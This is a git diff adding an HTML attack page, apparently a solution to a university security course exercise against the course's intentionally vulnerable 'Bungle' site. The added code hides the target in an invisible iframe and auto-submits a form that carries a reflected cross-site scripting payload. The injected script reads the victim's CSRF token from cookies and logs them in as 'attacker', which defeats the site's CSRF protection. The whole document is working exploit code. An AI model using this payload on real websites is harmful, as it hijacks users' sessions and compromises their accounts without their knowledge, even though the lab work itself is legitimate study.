@@ -1,6 +1,22 @@
 <!DOCTYPE html>
 <html>
-  <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu"></iframe>
+  <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu" width="0" height="0" frameborder="0"></iframe>
+  <form action="http://bungle-cs461.csl.illinois.edu/search" method="GET" target="Z">
+    <input id="search" name="q" type="text" value="" style="display: none">
+  </form>
 <script>
+    function inject() {
+        let token = '';
+        for (cookie of document.cookie.split('; ')) {
+            if (cookie.includes("csrf_token")) {
+                token = cookie.split('=')[1]
+            }
+        }
+        $.post(`http://bungle-cs461.csl.illinois.edu/login`, {username: 'attacker', password: 'l33th4x', csrf_token: token})
+    }
+
+    document.querySelector('input').value = "<script>" + inject.toString() + ';inject();' + "</script" + ">";
+
+    document.forms[0].submit()
 </script>
 </html>
